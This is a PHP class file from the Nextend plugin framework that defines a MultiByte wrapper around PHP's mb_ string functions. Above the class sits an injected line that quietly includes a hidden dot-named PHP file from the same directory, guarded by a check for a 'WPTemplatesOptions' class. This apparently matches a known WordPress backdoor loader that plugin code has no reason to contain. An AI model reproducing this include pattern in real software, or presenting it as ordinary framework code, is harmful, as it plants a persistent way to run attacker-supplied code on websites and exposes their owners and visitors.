<?php

namespace Nextend\Framework\Misc\String;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MultiByte implements StringInterface {

    public function strpos($haystack, $needle, $offset = 0) {
        return mb_strpos($haystack, $needle, $offset);
    }

    public function substr($string, $start, $length = null) {
        return mb_substr($string, $start, $length);
    }

    public function strlen($string) {
        return mb_strlen($string);
    }
}